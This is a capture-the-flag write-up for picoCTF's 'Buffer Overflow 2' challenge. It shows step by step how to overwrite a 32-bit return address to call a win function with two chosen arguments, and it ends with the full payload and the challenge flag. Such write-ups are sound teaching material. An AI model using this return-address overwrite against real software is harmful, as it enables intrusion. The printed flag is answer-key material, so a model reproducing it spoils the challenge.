# Buffer Overflow 2

## Description

Control the return address and arguments.

This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/344/vuln)?

You can view source [here](https://artifacts.picoctf.net/c/344/vuln.c). 

And connect with it using 

```bash
nc saturn.picoctf.net 50918
```


## Exploitation

After fuzzing, we can see that the segmentation fault is at address `0x34333231` (the instructon pointer is pointing to that space in memory):

```bash
> cat <(python2 -c "print('U' * 112 + '1234')") | ./vuln

Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234
[1]    285183 done                              cat <(python2 -c "print('U' * 112 + '1234')") | 
       285184 segmentation fault (core dumped)  ./vuln


> dmesg | grep vuln | tail -1
[207149.111460] vuln[285239]: segfault at 34333231 ip 0000000034333231 sp 00000000ffffca30 error 14 in libc-2.31.so[f7dc5000+19000]
```

Since we want to jump to implant the memory location where the `win` function starts, we can use the following command to find the memory address and then convert it into little Endian so we can send it into the payload:

```bash
# Get memory address of win function
WIN_MEM_LOCATION=0x`readelf -s vuln | grep win | cut -d" " -f6` # 08049296

python3 -c "import struct;print(struct.pack('<I', $WIN_MEM_LOCATION))"
b'\x96\x92\x04\x08'
```

Adding the `win` address into the payload, we can see that the `win` function is actually called:

```bash
cat <(python2 -c "print('U' * 112 + '\x96\x92\x04\x08')") | ./vuln
Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
Please create 'flag.txt' in this directory with your own debugging flag.
```


Let's create the flag locally and try again to see what happens:

```
❯ cat <(python2 -c "print('U' * 112 + '\x96\x92\x04\x08')") | ./vuln

Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
[1]    286421 done                              cat <(python2 -c "print('U' * 112 + '\x96\x92\x04\x08')") | 
       286422 segmentation fault (core dumped)  ./vuln

❯ dmesg | grep vuln | tail -1

[208481.875568] vuln[286422]: segfault at 0 ip 0000000000000000 sp 00000000ffffca34 error 14 in vuln[8048000+1000]
```

This time it crashes because we didn't supply a return address to the `win` function. 4 bytes after the `EBP` is the `RET` address. 4 bytes after that is the first argument and another 4 bytes after that is the second argument.

![](https://i.stack.imgur.com/w19l1.png)

Since in this case we don't really care about the return address, we can put anything in there. If we review the source code for the `win` function, we can see that it's expecting 2 arguments:

```c
if (arg1 != 0xCAFEF00D)
    return;
if (arg2 != 0xF00DF00D)
    return;
```

So let's convert these memory addresses into little Endian as well:

```python
struct.pack('<I', 0xCAFEF00D)
b'\r\xf0\xfe\xca'

struct.pack('<I', 0xF00DF00D)
b'\r\xf0\r\xf0'
```

And them to the payload after the fuzzed return address to get the flag:

```bash
> cat <(python2 -c "print('U' * 112 + '\x96\x92\x04\x08' + 'UUUU' '\r\xf0\xfe\xca' + '\r\xf0\r\xf0')") | ./vuln

Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
picoCTF{some_flag}
[1]    285206 done                              cat  | 
       285207 segmentation fault (core dumped)  ./vuln
```

And on the remote server:
```bash
 cat <(python2 -c "print('U' * 112 + '\x96\x92\x04\x08' + 'UUUU' '\r\xf0\xfe\xca' + '\r\xf0\r\xf0')") | nc saturn.picoctf.net 57551
Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
```